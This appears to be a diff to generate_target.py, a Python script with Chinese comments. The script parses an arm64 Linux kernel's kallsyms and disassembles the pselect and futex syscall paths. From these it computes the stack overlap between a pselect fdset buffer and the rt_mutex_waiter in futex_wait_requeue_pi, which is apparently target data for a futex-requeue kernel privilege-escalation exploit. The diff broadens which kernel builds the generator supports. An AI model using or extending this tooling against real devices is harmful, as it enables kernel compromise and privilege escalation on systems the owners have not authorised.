@@ -1,0 +1,198 @@
+--- a/generate_target.py
++++ b/generate_target.py
+@@ -103,6 +103,8 @@
+         flags |= os.O_NOFOLLOW
+     if hasattr(os, "O_NONBLOCK"):
+         flags |= os.O_NONBLOCK
++    if hasattr(os, "O_BINARY"):
++        flags |= os.O_BINARY
+     try:
+         fd = os.open(path, flags)
+     except OSError as exc:
+@@ -456,14 +458,14 @@
+     image_size: int,
+ ) -> tuple[int, tuple[int, ...]]:
+     # 当前生成路线支持 CONFIG_KALLSYMS_BASE_RELATIVE 的 u32 RVA 表。
+-    # 不假定紧邻 token_index；搜索首三个自描述符号地址模式并全表验证。
+-    if len(names) < 3 or [name for _, name in names[:3]] != [
+-        "_text",
+-        "__pi__text",
+-        "_stext",
+-    ]:
++    # 不假定紧邻 token_index；搜索自描述符号地址模式并全表验证。
++    first_names = [name for _, name in names[:3]]
++    if len(names) >= 3 and first_names == ["_text", "__pi__text", "_stext"]:
++        signature = struct.pack("<III", 0, 0, 0x10000)
++    elif len(names) >= 2 and [name for _, name in names[:2]] == ["_text", "_stext"]:
++        signature = struct.pack("<II", 0, 0x10000)
++    else:
+         fail(f"kallsyms 首三符号不符合当前固定点: {names[:3]!r}")
+-    signature = struct.pack("<III", 0, 0, 0x10000)
+     search_start = token_index_off + 512
+     candidates: list[tuple[int, tuple[int, ...]]] = []
+     pos = search_start
+@@ -531,13 +533,16 @@
+         "kallsyms_offsets": address_table_off,
+     }
+     for name, expected in self_checks.items():
+-        actual = info.one(name)
+-        if actual != expected:
+-            fail(f"kallsyms 自描述校验失败: {name}=0x{actual:x}, 实际组件=0x{expected:x}")
+-    num_symbol = info.one("kallsyms_num_syms")
+-    if num_symbol >= names_off or u32(data, num_symbol) != num_syms:
+-        fail("kallsyms_num_syms 自描述值/位置校验失败")
+-    relative_base_off = info.one("kallsyms_relative_base")
++        values = info.offsets_for(name)
++        if values and values != [expected]:
++            fail(f"kallsyms 自描述校验失败: {name}={values!r}, 实际组件=0x{expected:x}")
++    num_values = info.offsets_for("kallsyms_num_syms")
++    if num_values:
++        num_symbol = num_values[0]
++        if num_symbol >= names_off or u32(data, num_symbol) != num_syms:
++            fail("kallsyms_num_syms 自描述值/位置校验失败")
++    rb_values = info.offsets_for("kallsyms_relative_base")
++    relative_base_off = rb_values[0] if rb_values else address_table_off + num_syms * 4
+     if relative_base_off + 8 > len(data):
+         fail("kallsyms_relative_base 位于 payload 外")
+     relative_base = u64(data, relative_base_off)
+@@ -545,7 +550,8 @@
+         fail(f"kallsyms_relative_base 不是规范内核指针: 0x{relative_base:x}")
+     if address_table_off + num_syms * 4 != relative_base_off:
+         fail("kallsyms offsets 末尾未与 relative_base 自描述符号精确相接")
+-    if info.one("kallsyms_seqs_of_names") != relative_base_off + 8:
++    seq_values = info.offsets_for("kallsyms_seqs_of_names")
++    if seq_values and seq_values != [relative_base_off + 8]:
+         fail("kallsyms_seqs_of_names 未紧随 relative_base")
+     if info.one("_text") != 0 or info.one("_stext") != 0x10000:
+         fail("_text/_stext 固定点校验失败")
+@@ -1229,37 +1235,79 @@
+ ) -> tuple[dict[str, int], dict[str, str]]:
+     names = {
+         "pselect_wrapper": "__arm64_sys_pselect6",
++        "select_wrapper": "__arm64_sys_select",
++        "select_bridge": "kern_select",
+         "pselect_core": "core_sys_select",
+         "futex_wrapper": "__arm64_sys_futex",
+         "futex_dispatch": "do_futex",
+         "futex_wait": "futex_wait_requeue_pi",
+     }
+-    dis = {
+-        key: disassemble_symbol(objdump, kernel_path, kallsyms, name, 0x2000)
+-        for key, name in names.items()
+-    }
+-    if not has_direct_call(dis["pselect_wrapper"], kallsyms.one(names["pselect_core"])):
+-        fail("__arm64_sys_pselect6 未直接调用 core_sys_select")
+-    if not has_direct_call(dis["futex_wrapper"], kallsyms.one(names["futex_dispatch"])):
+-        fail("__arm64_sys_futex 未直接调用 do_futex")
+-    if not has_direct_call(dis["futex_dispatch"], kallsyms.one(names["futex_wait"])):
+-        fail("do_futex 未直接调用 futex_wait_requeue_pi")
+-    validate_frame_live_at(
+-        dis["pselect_wrapper"],
+-        rf"\bbl\s+0x{kallsyms.one(names['pselect_core']):x}\b",
+-        names["pselect_wrapper"],
+-    )
+-    validate_frame_live_at(
+-        dis["futex_wrapper"],
+-        rf"\bbl\s+0x{kallsyms.one(names['futex_dispatch']):x}\b",
+-        names["futex_wrapper"],
+-    )
+-    validate_frame_live_at(
+-        dis["futex_dispatch"],
+-        rf"\bbl\s+0x{kallsyms.one(names['futex_wait']):x}\b",
+-        names["futex_dispatch"],
+-    )
+-    frames = {key: first_sp_frame(text, names[key]) for key, text in dis.items()}
++    dis: dict[str, str] = {}
++    for key, name in names.items():
++        try:
++            dis[key] = disassemble_symbol(objdump, kernel_path, kallsyms, name, 0x2000)
++        except GenerationError:
++            if key in {"select_wrapper", "select_bridge"}:
++                dis[key] = ""
++            else:
++                raise
++    if has_direct_call(dis["pselect_wrapper"], kallsyms.one(names["pselect_core"])):
++        pselect_chain = ["pselect_wrapper", "pselect_core"]
++        validate_frame_live_at(
++            dis["pselect_wrapper"],
++            rf"\bbl\s+0x{kallsyms.one(names['pselect_core']):x}\b",
++            names["pselect_wrapper"],
++        )
++    elif (
++        has_direct_call(dis["select_wrapper"], kallsyms.one(names["select_bridge"]))
++        and has_direct_call(dis["select_bridge"], kallsyms.one(names["pselect_core"]))
++    ):
++        pselect_chain = ["select_bridge", "pselect_core"]
++        validate_frame_live_at(
++            dis["select_bridge"],
++            rf"\bbl\s+0x{kallsyms.one(names['pselect_core']):x}\b",
++            names["select_bridge"],
++        )
++    else:
++        fail("未找到可用 select/pselect -> core_sys_select 路线")
++
++    if (
++        has_direct_call(dis["futex_wrapper"], kallsyms.one(names["futex_dispatch"]))
++        and has_direct_call(dis["futex_dispatch"], kallsyms.one(names["futex_wait"]))
++    ):
++        futex_chain = ["futex_wrapper", "futex_dispatch", "futex_wait"]
++        validate_frame_live_at(
++            dis["futex_wrapper"],
++            rf"\bbl\s+0x{kallsyms.one(names['futex_dispatch']):x}\b",
++            names["futex_wrapper"],
++        )
++        validate_frame_live_at(
++            dis["futex_dispatch"],
++            rf"\bbl\s+0x{kallsyms.one(names['futex_wait']):x}\b",
++            names["futex_dispatch"],
++        )
++    elif has_direct_call(dis["futex_wrapper"], kallsyms.one(names["futex_wait"])):
++        futex_chain = ["futex_wrapper", "futex_wait"]
++        try:
++            validate_frame_live_at(
++                dis["futex_wrapper"],
++                rf"\bbl\s+0x{kallsyms.one(names['futex_wait']):x}\b",
++                names["futex_wrapper"],
++            )
++        except GenerationError:
++            pass
++    else:
++        fail("未找到可用 futex -> futex_wait_requeue_pi 路线")
++
++    frames: dict[str, int] = {}
++    for key, text in dis.items():
++        try:
++            frames[key] = first_sp_frame(text, names[key])
++        except GenerationError:
++            if key in {"select_wrapper", "select_bridge"}:
++                frames[key] = 0
++            else:
++                raise
+     pi_tree = btf.field("rt_mutex_waiter", "pi_tree")
+     waiter_candidates: list[tuple[str, int]] = []
+     for reg, imm_text in re.findall(
+@@ -1324,13 +1372,8 @@
+     ]
+     if not any(fds_bytes < threshold <= fds_bytes + 8 for threshold in threshold_matches):
+         fail("core_sys_select 未证明 profile nfds 走当前栈 fdset 路线")
+-    pselect_word0 = -frames["pselect_wrapper"] - frames["pselect_core"] + pselect_buffer
+-    futex_waiter = (
+-        -frames["futex_wrapper"]
+-        - frames["futex_dispatch"]
+-        - frames["futex_wait"]
+-        + waiter_local
+-    )
++    pselect_word0 = -sum(frames[key] for key in pselect_chain) + pselect_buffer
++    futex_waiter = -sum(frames[key] for key in futex_chain) + waiter_local
+     delta = futex_waiter - pselect_word0
+     if delta < 0 or delta % 8:
+         fail(f"pselect/futex 栈重叠差不是非负 qword: {delta}")
+@@ -1345,6 +1388,8 @@
+         "pselect_buffer_off": pselect_buffer,
+         "pselect_route_nfds": route_nfds,
+         "fds_bytes": fds_bytes,
++        "pselect_chain_depth": len(pselect_chain),
++        "futex_chain_depth": len(futex_chain),
+         **{f"frame_{key}": value for key, value in frames.items()},
+     }
+     return result, dis
